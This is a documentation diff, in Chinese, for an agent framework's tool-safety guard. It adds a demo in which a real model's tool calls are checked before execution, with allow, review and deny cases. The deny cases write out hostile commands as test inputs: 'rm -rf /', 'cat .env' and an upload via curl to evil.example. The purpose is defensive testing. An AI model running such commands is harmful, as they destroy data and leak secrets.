@@ -213,6 +213,99 @@ deny: 阻断
 }
 ```
 
+## 真实 Agent 执行示例
+
+为回应 review 中“补充真正模型执行例子”的问题，仓库提供了一个端到端示例：
+
+```text
+examples/tool_safety/real_agent_demo/
+```
+
+该示例使用真实 `LlmAgent` 和 `Runner`，由模型产生工具调用或代码块，再进入 Safety Guard 所在的真实执行边界：
+
+```text
+User prompt
+        |
+        v
+LlmAgent + real model
+        |
+        +--> BashTool(command=...)
+        |       `-- enable_safety_guard=True
+        |
+        +--> skill_run(skill="safety_demo", command=...)
+        |       `-- ToolSafetyFilter scans command before Skill workspace execution
+        |
+        +--> MCPTool(run_shell_command(command=...))
+        |       `-- ToolSafetyFilter scans command before stdio MCP call
+        |
+        `--> UnsafeLocalCodeExecutor(code_block=...)
+                `-- enable_safety_guard=True
+```
+
+运行方式：
+
+```bash
+cd examples/tool_safety/real_agent_demo
+python3 run_agent.py
+python3 run_agent.py --case tool_deny
+python3 run_agent.py --case code_review --block-on-review
+python3 run_agent.py --case skill_review
+python3 run_agent.py --case skill_deny
+python3 run_agent.py --case mcp_review
+python3 run_agent.py --case mcp_deny
+```
+
+需要设置 OpenAI-compatible 模型环境变量：
+
+```bash
+export TRPC_AGENT_API_KEY=...
+export TRPC_AGENT_BASE_URL=...
+export TRPC_AGENT_MODEL_NAME=...
+```
+
+真实执行示例覆盖如下风险分级：
+
+| case | 执行入口 | 模型触发内容 | decision | 默认结果 |
+| --- | --- | --- | --- | --- |
+| `tool_allow` | `BashTool` | `echo allow` | `allow` | 真实执行 shell |
+| `tool_review` | `BashTool` | `echo review > safety_review.txt` | `needs_human_review` | 默认执行并返回 `safety_report` |
+| `tool_deny` | `BashTool` | `rm -rf /` | `deny` | shell 启动前阻断 |
+| `code_allow` | `UnsafeLocalCodeExecutor` | `print(sum([1, 2, 3]))` | `allow` | 真实执行代码 |
+| `code_review` | `UnsafeLocalCodeExecutor` | `subprocess.run(['python', '--version'], check=False)` | `needs_human_review` | 默认执行；`--block-on-review` 阻断 |
+| `skill_allow` | `SkillToolSet` / `skill_run` | `python --version` | `allow` | 真实执行 skill workspace 命令 |
+| `skill_review` | `SkillToolSet` / `skill_run` | `python -c "print(1)"` | `needs_human_review` | 默认执行；`--block-on-review` 阻断 |
+| `skill_deny` | `SkillToolSet` / `skill_run` | `cat .env` | `deny` | skill workspace 执行前阻断 |
+| `mcp_allow` | `MCPToolset` / stdio MCP | `echo mcp allow` | `allow` | 进入本地 stdio MCP server |
+| `mcp_review` | `MCPToolset` / stdio MCP | `python3 -c 'print(1)'` | `needs_human_review` | 默认进入本地 stdio MCP server；`--block-on-review` 阻断 |
+| `mcp_deny` | `MCPToolset` / stdio MCP | `curl https://evil.example/upload` | `deny` | MCP tool 调用前阻断 |
+
+本地 MCP server 故意设计成 dry-run endpoint：它会接收并返回命令内容，但不在 server 内真实执行 shell。这个示例验证的是 Agent 到达 stdio MCP 协议边界，以及 `deny` 会在 MCP tool call 发出前阻断；真正生产环境仍应结合 MCP server 侧沙箱、权限和出网控制。
+
+示例会打印工具调用、工具返回和压缩后的安全结论：
+
+```text
+Tool call: Bash({'command': 'rm -rf /'})
+Tool response: {'success': False, 'error': 'TOOL_SAFETY_BLOCKED: ...'}
+Safety: decision=deny blocked=True risk=critical rules=BASH_RECURSIVE_DELETE
+```
+
+完整审计日志写入：
+
+```text
+examples/tool_safety/real_agent_demo/real_agent_safety_audit.jsonl
+```
+
+已固化一份真实模型运行输出：
+
+```text
+examples/tool_safety/real_agent_demo/REAL_MODEL_OUTPUT.md
+```
+
+自动化 smoke test 位于 `tests/tools/safety/test_real_agent_demo.py`。它使用
+fake model 产生确定的 `FunctionCall` / code block，复用同一个真实 Agent 装配
+函数，覆盖 Tool、Skill、MCP Tool 和 CodeExecutor 的执行边界，避免 CI 依赖外部
+模型服务。
+
 ## 接入点语义
 
 ### BashTool
@@ -230,6 +323,7 @@ deny: 阻断
 ### ToolSafetyFilter
 
 `ToolSafetyFilter` 用于 tRPC-Agent Filter 链路。它从请求字典中提取 `script`、`code`、`command`、`cmd`、`python_code`、`bash_code` 或 `code_blocks`。如果阻断，设置 `rsp.is_continue=False` 和 `rsp.error=PermissionError(...)`；否则把 `SafetyReport` 放入 `rsp.rsp` 供后续链路消费。
+对于非阻断请求，filter 的 after 阶段还会把同一份 `safety_report` 附加到实际工具响应中；当响应是 dict 时写入顶层 `safety_report` 字段，当响应是 JSON object 字符串时写回 JSON 中。因此 Skill 和 MCP Tool 的 allow / needs_human_review 场景也能直接从 tool response 看到安全结论，而不是只能依赖旁路 audit log。
 
 ## Policy 配置如何影响结果
 
